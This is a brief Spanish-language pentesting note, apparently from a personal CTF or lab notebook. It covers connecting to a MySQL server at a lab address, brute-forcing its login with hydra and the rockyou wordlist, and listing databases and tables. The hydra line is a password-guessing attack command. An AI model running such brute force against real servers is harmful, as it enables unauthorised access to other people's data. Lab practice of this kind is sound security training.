Servidor de base de datos

Si queremos conectarnos a un servidor mysql aplicar el siguiente comando:

```
mysql -h 172.17.0.2 -P 3306 -u capybarauser -p ie168
```

Si se quiere realizar fuerza bruta realizar lo siguiente con [[hydra]]:

```
hydra -l user -P /usr/share/KaliLists/rockyou.txt mysql://172.17.0.2 -t 64
```

Algunas consultas que pueden ser utilices son las siguientes:

```
SHOW DATABASES;

USE DB_NAME;

SHOW TABLES;

SELECT * FROM TABLE_NAME;
```
